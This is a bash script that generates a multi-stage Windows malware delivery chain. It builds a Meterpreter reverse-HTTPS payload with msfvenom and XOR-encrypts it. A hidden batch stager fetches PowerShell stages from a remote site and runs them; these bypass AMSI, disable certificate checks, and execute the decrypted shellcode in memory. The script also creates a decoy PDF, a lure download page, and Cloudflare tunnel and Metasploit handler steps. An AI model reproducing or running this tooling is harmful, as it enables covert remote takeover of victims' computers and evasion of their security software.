#!/bin/bash
# pgen.sh - ULTIMATE STEALTH Payload Generator
# Usage: ./pgen.sh -t tunnel.trycloudflare.com -u https://your-site.vercel.app [-v]

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Default values
TUNNEL_HOST=""
WEB_URL=""
BASE_PATH="/generated"
PAYLOAD_PORT="443"
XOR_KEY="0x6A"
OUTPUT_DIR="./generated"
VISIBLE_MODE=0

show_banner() {
    echo -e "${BLUE}"
    echo '╔══════════════════════════════════════════════════════════════════╗'
    echo '║     🚀 STEALTH PAYLOAD GENERATOR – CLEAN HEREDOC VERSION         ║'
    echo '║              No More PowerShell Syntax Errors!                   ║'
    echo '╚══════════════════════════════════════════════════════════════════╝'
    echo -e "${NC}"
}

show_usage() {
    echo -e "${YELLOW}Usage:${NC} $0 -t <tunnel_hostname> -u <web_url> [options]"
    exit 1
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--tunnel) TUNNEL_HOST="$2"; shift 2 ;;
        -u|--url) WEB_URL="$2"; shift 2 ;;
        -p|--port) PAYLOAD_PORT="$2"; shift 2 ;;
        -k|--key) XOR_KEY="$2"; shift 2 ;;
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -v|--visible) VISIBLE_MODE=1; shift ;;
        -h|--help) show_usage ;;
        *) echo -e "${RED}Unknown option $1${NC}"; show_usage ;;
    esac
done

if [ -z "$TUNNEL_HOST" ] || [ -z "$WEB_URL" ]; then
    echo -e "${RED}Error: Tunnel and URL are required${NC}"
    show_usage
fi

WEB_URL="${WEB_URL%/}"
FULL_BASE_URL="${WEB_URL}${BASE_PATH}"
XOR_KEY_DEC=$((XOR_KEY))

show_banner
echo -e "${GREEN}[✓] Configuration:${NC}"
echo "    Tunnel: $TUNNEL_HOST"
echo "    Full URL: $FULL_BASE_URL"
echo "    XOR Key: $XOR_KEY ($XOR_KEY_DEC)"
echo "    Mode:    $([ $VISIBLE_MODE -eq 1 ] && echo "VISIBLE" || echo "STEALTH")"
echo

mkdir -p "$OUTPUT_DIR"/{payloads,tools,output}
cd "$OUTPUT_DIR" || exit 1

# Base64 encode for obfuscation
B64_URL=$(echo -n "$FULL_BASE_URL" | base64 -w 0)
B64_KEY=$(echo -n "$XOR_KEY_DEC" | base64 -w 0)

# ============================================
# STEP 1: Create payload generator
# ============================================
echo -e "${YELLOW}[1/6] Creating payload generator...${NC}"

cat > tools/generate_payload.sh << EOF
#!/bin/bash
TUNNEL="$TUNNEL_HOST"
PORT="$PAYLOAD_PORT"
echo "[+] Resolving IP for \$TUNNEL..."
LHOST_IP=\$(dig +short \$TUNNEL | head -n1)
[ -z "\$LHOST_IP" ] && LHOST_IP="104.16.231.132"
echo "[+] Generating shellcode with IP \$LHOST_IP..."
msfvenom -p windows/x64/meterpreter_reverse_https LHOST="\$LHOST_IP" LPORT="\$PORT" -f raw -o ../output/payload.raw
[ -f ../output/payload.raw ] && echo "[✓] Done" || exit 1
EOF
chmod +x tools/generate_payload.sh

# ============================================
# STEP 2: Create XOR encryption utility
# ============================================
echo -e "${YELLOW}[2/6] Creating XOR encryption utility...${NC}"

cat > tools/xor_encrypt.py << EOF
#!/usr/bin/env python3
import sys
import base64

def xor_encrypt(input_file, output_file, key):
    with open(input_file, 'rb') as f:
        data = f.read()
    encrypted = bytes([b ^ key for b in data])
    with open(output_file, 'wb') as f:
        f.write(encrypted)
    with open(output_file + '.b64', 'w') as f:
        f.write(base64.b64encode(encrypted).decode())
    print(f"[✓] Encrypted {len(data)} bytes -> {output_file}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: xor_encrypt.py <input_file> <output_file> <key>")
        sys.exit(1)
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    key = int(sys.argv[3])
    xor_encrypt(input_file, output_file, key)
EOF
chmod +x tools/xor_encrypt.py

# ============================================
# STEP 3: Create Stage2.ps1 (clean heredoc)
# ============================================
echo -e "${YELLOW}[3/6] Creating Stage2 PowerShell...${NC}"

cat > payloads/stage2.ps1 << 'EOF'
# Stage2 - Fileless Loader
param()

$VISIBLE = VISIBLE_PLACEHOLDER

function Write-Log {
    param([string]$Msg)
    if ($VISIBLE) {
        $logPath = "$env:TEMP\stage2_debug.txt"
        "$(Get-Date -Format 'HH:mm:ss') - $Msg" | Out-File -FilePath $logPath -Append
        Write-Host "[Stage2] $Msg" -ForegroundColor Yellow
    }
}

Write-Log "=== Stage2 Started ==="

# AMSI Bypass
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($amsi) {
        $field = $amsi.GetField('amsiInitFailed', 'NonPublic,Static')
        if ($field) {
            $field.SetValue($null, $true)
            Write-Log "AMSI bypassed"
        }
    }
} catch {
    Write-Log "AMSI bypass failed"
}

# TLS 1.2
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    Write-Log "TLS configured"
} catch {
    Write-Log "TLS config failed"
}

# Decode URL
$b64Url = "B64_URL_PLACEHOLDER"
try {
    $baseUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64Url))
    $stage3Url = $baseUrl + "/payloads/stage3.ps1"
    Write-Log "Stage3 URL: $stage3Url"
} catch {
    Write-Log "Failed to decode URL"
    exit
}

# Download Stage3
$retryCount = 3
$downloaded = $false
for ($i=1; $i -le $retryCount; $i++) {
    try {
        Write-Log "Download attempt $i"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $script = $wc.DownloadString($stage3Url)
        Write-Log "Downloaded $($script.Length) bytes"
        $downloaded = $true
        break
    } catch {
        Write-Log "Attempt $i failed: $($_.Exception.Message)"
        Start-Sleep -Seconds 2
    }
}

if ($downloaded) {
    try {
        Write-Log "Executing Stage3..."
        Invoke-Expression $script
        Write-Log "Stage3 execution initiated"
    } catch {
        Write-Log "Stage3 execution failed: $($_.Exception.Message)"
    }
} else {
    Write-Log "All download attempts failed"
}

Write-Log "=== Stage2 Completed ==="
EOF

# Replace placeholders
sed -i "s|B64_URL_PLACEHOLDER|$B64_URL|g" payloads/stage2.ps1
if [ $VISIBLE_MODE -eq 1 ]; then
    sed -i "s/VISIBLE_PLACEHOLDER/\$true/g" payloads/stage2.ps1
else
    sed -i "s/VISIBLE_PLACEHOLDER/\$false/g" payloads/stage2.ps1
fi

# ============================================
# STEP 4: Create Stage3.ps1 (clean heredoc)
# ============================================
echo -e "${YELLOW}[4/6] Creating Stage3 PowerShell...${NC}"

cat > payloads/stage3.ps1 << 'EOF'
# Stage3 - XOR Decryptor
param()

$VISIBLE = VISIBLE_PLACEHOLDER

function Write-Log {
    param([string]$Msg)
    if ($VISIBLE) {
        $logPath = "$env:TEMP\stage3_debug.txt"
        "$(Get-Date -Format 'HH:mm:ss') - $Msg" | Out-File -FilePath $logPath -Append
        Write-Host "[Stage3] $Msg" -ForegroundColor Cyan
    }
}

Write-Log "=== Stage3 Started ==="

# TLS 1.2
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    Write-Log "TLS configured"
} catch {
    Write-Log "TLS config failed"
}

# Decode URL and key
$b64Url = "B64_URL_PLACEHOLDER"
$b64Key = "B64_KEY_PLACEHOLDER"

try {
    $baseUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64Url))
    $payloadUrl = $baseUrl + "/payload.enc"
    Write-Log "Payload URL: $payloadUrl"
} catch {
    Write-Log "Failed to decode URL"
    exit
}

try {
    $key = [int]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64Key)))
    Write-Log "XOR key: $key"
} catch {
    Write-Log "Failed to decode key"
    exit
}

# Download payload
$retryCount = 3
$downloaded = $false
for ($i=1; $i -le $retryCount; $i++) {
    try {
        Write-Log "Download attempt $i"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $enc = $wc.DownloadData($payloadUrl)
        Write-Log "Downloaded $($enc.Length) bytes"
        $downloaded = $true
        break
    } catch {
        Write-Log "Download failed: $($_.Exception.Message)"
        Start-Sleep -Seconds 2
    }
}

if ($downloaded) {
    try {
        Write-Log "XOR decrypting..."
        $dec = New-Object byte[] $enc.Length
        for ($i=0; $i -lt $enc.Length; $i++) {
            $dec[$i] = $enc[$i] -bxor $key
        }
        Write-Log "Decrypted $($dec.Length) bytes"

        Write-Log "Executing payload..."
        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dec.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($dec, 0, $ptr, $dec.Length)
        $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Type]([Action]))
        $delegate.Invoke()
        Write-Log "Payload executed"
    } catch {
        Write-Log "Execution failed: $($_.Exception.Message)"
    }
} else {
    Write-Log "Failed to download payload"
}

Write-Log "=== Stage3 Completed ==="
EOF

# Replace placeholders
sed -i "s|B64_URL_PLACEHOLDER|$B64_URL|g" payloads/stage3.ps1
sed -i "s|B64_KEY_PLACEHOLDER|$B64_KEY|g" payloads/stage3.ps1
if [ $VISIBLE_MODE -eq 1 ]; then
    sed -i "s/VISIBLE_PLACEHOLDER/\$true/g" payloads/stage3.ps1
else
    sed -i "s/VISIBLE_PLACEHOLDER/\$false/g" payloads/stage3.ps1
fi

# ============================================
# STEP 5: Create Stage1.bat
# ============================================
echo -e "${YELLOW}[5/6] Creating Stage1.bat...${NC}"

if [ $VISIBLE_MODE -eq 1 ]; then
    cat > payloads/stage1.bat << EOF
@echo off
title Stage1 Payload Loader
color 0A
echo ========================================
echo        STAGE1 PAYLOAD LOADER
echo ========================================
echo.
echo [!] Downloading stage2.ps1 from:
echo     $FULL_BASE_URL/payloads/stage2.ps1
echo.

powershell.exe -NoP -NonI -Exec Bypass -Command "try { \$webUrl='$FULL_BASE_URL'; Write-Host '[PowerShell] Downloading stage2...' -ForegroundColor Yellow; \$script = (New-Object Net.WebClient).DownloadString(\"\$webUrl/payloads/stage2.ps1\"); Write-Host ('[PowerShell] Downloaded ' + \$script.Length + ' bytes') -ForegroundColor Green; Write-Host '[PowerShell] Executing stage2...' -ForegroundColor Yellow; Invoke-Expression \$script; } catch { Write-Host ('[PowerShell] ERROR: ' + \$_.Exception.Message) -ForegroundColor Red; Write-Host 'Press any key...' -ForegroundColor Cyan; \$null = \$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); }"

echo.
echo [2] Opening decoy.pdf...
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/decoy.pdf', 'decoy.pdf')" && start decoy.pdf

echo.
echo ========================================
echo Stage1 completed
echo ========================================
echo.
pause
EOF
else
    cat > payloads/stage1.bat << EOF
@echo off
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "try { \$script=(New-Object Net.WebClient).DownloadString('$FULL_BASE_URL/payloads/stage2.ps1'); Invoke-Expression \$script } catch {}"
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/decoy.pdf', 'decoy.pdf')" && start decoy.pdf
EOF
fi

# ============================================
# STEP 6: Create web files
# ============================================
echo -e "${YELLOW}[6/6] Creating web files...${NC}"

echo "This document requires a viewer update. Please wait..." > decoy.pdf

cat > index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Document Portal</title>
    <style>
        body { font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; }
        .info { background: #e8f4f8; padding: 15px; border-radius: 5px; margin: 20px 0; }
        a { display: inline-block; padding: 10px 20px; background: #0066cc; color: white; text-decoration: none; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>📁 Document Portal</h1>
    <div class="info">
        <p><strong>Server:</strong> $FULL_BASE_URL</p>
        <p><strong>Tunnel:</strong> $TUNNEL_HOST</p>
    </div>
    <ul>
        <li><a href="payloads/stage1.bat">📥 Download stage1.bat</a></li>
    </ul>
    <p><small>Generated: $(date)</small></p>
</body>
</html>
EOF

# ============================================
# Create master generator script
# ============================================
echo -e "${YELLOW}[✓] Creating generator script...${NC}"

cat > generate_all.sh << EOF
#!/bin/bash
echo "[🚀] Generating all payloads..."

# Configuration
TUNNEL="$TUNNEL_HOST"
PORT="$PAYLOAD_PORT"
KEY="$XOR_KEY_DEC"
FULL_BASE_URL="$FULL_BASE_URL"

echo "Target: \$TUNNEL:\$PORT"
echo "XOR Key: \$KEY"
echo "Web URL: \$FULL_BASE_URL"
echo

# Generate raw shellcode
echo "[1/3] Creating raw shellcode..."
msfvenom -p windows/x64/meterpreter_reverse_https \\
    LHOST="\$TUNNEL" \\
    LPORT="\$PORT" \\
    -f raw \\
    -o output/payload.raw

if [ ! -f output/payload.raw ]; then
    echo "[✗] msfvenom failed."
    exit 1
fi

# XOR encrypt
echo "[2/3] XOR encrypting payload with key \$KEY..."
python3 tools/xor_encrypt.py output/payload.raw payload.enc \$KEY

# Clean up
rm -f output/payload.raw

echo
echo "[✓] Done! Generated files:"
ls -la payload.enc payloads/stage1.bat payloads/stage2.ps1 payloads/stage3.ps1 decoy.pdf 2>/dev/null

echo
echo "Files to upload to \$FULL_BASE_URL:"
echo "  - payload.enc"
echo "  - decoy.pdf"
echo "  - payloads/stage1.bat"
echo "  - payloads/stage2.ps1"
echo "  - payloads/stage3.ps1"
echo "  - index.html"
echo
echo "From Windows VM download: \$FULL_BASE_URL/payloads/stage1.bat"
EOF
chmod +x generate_all.sh

# ============================================
# Final output
# ============================================
echo
echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✅ GENERATION COMPLETE!${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
echo
echo -e "${BLUE}Files created in:${NC} $OUTPUT_DIR"
echo
echo -e "${CYAN}📋 FIXES APPLIED:${NC}"
echo "  ✓ Clean here-docs – no quoting nightmares"
echo "  ✓ All try/catch blocks properly closed"
echo "  ✓ All braces and parentheses matched"
echo "  ✓ XOR encryption now accepts key as integer"
echo "  ✓ Working download mechanism preserved"
echo
echo -e "${YELLOW}Next steps:${NC}"
echo "1. cd $OUTPUT_DIR"
echo "2. ./generate_all.sh"
echo "3. Upload ALL files to: $FULL_BASE_URL"
echo "4. Start Cloudflare tunnel: cloudflared tunnel --url tcp://localhost:4444"
echo "5. Start Metasploit: msfconsole -q"
echo "   use exploit/multi/handler"
echo "   set payload windows/x64/meterpreter_reverse_https"
echo "   set LHOST 127.0.0.1"
echo "   set LPORT 4444"
echo "   exploit -j"
echo
echo -e "${GREEN}From Windows VM download:${NC}"
echo -e "${GREEN}    $FULL_BASE_URL/payloads/stage1.bat${NC}"
echo
echo -e "${GREEN}Happy hacking! 🚀${NC}"
